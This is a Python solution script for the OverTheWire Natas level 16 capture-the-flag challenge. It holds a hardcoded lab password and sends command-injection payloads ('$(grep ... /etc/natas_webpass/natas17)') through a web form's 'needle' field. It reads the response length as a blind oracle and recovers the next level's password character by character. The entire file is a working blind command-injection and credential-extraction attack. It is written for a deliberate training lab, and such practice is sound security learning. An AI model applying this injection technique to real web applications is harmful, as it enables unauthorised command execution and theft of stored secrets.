import requests
import string

URL = "http://natas16.natas.labs.overthewire.org/"
NATAS16_PASSWORD = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"  # Change this

s = requests.Session()
s.auth = ("natas16", NATAS16_PASSWORD)


def get_valid_characters():
    print(
        "[+] The password for natas17 contains these characters: ", end="", flush=True
    )
    characters = string.digits + string.ascii_letters
    valid_characters = ""
    for character in characters:
        payload = f"$(grep {character} /etc/natas_webpass/natas17)"
        data = {"needle": payload, "submit": "true"}
        r = s.post(URL, data=data)

        if len(r.content) == 1105:
            valid_characters += character
            print(character, end="", flush=True)

    return valid_characters


def get_password(valid_characters):
    print("\n[!] The password for natas17 is: ", end="", flush=True)
    natas17_password = ""
    for _ in range(32):
        for character in valid_characters:
            payload = (
                f"$(grep ^{natas17_password + character} /etc/natas_webpass/natas17)"
            )
            data = {"needle": payload, "submit": "true"}
            r = s.post(URL, data=data)

            if len(r.content) == 1105:
                natas17_password += character
                print(character, end="", flush=True)

    return natas17_password


def main():
    valid_characters = get_valid_characters()
    get_password(valid_characters)


if __name__ == "__main__":
    main()
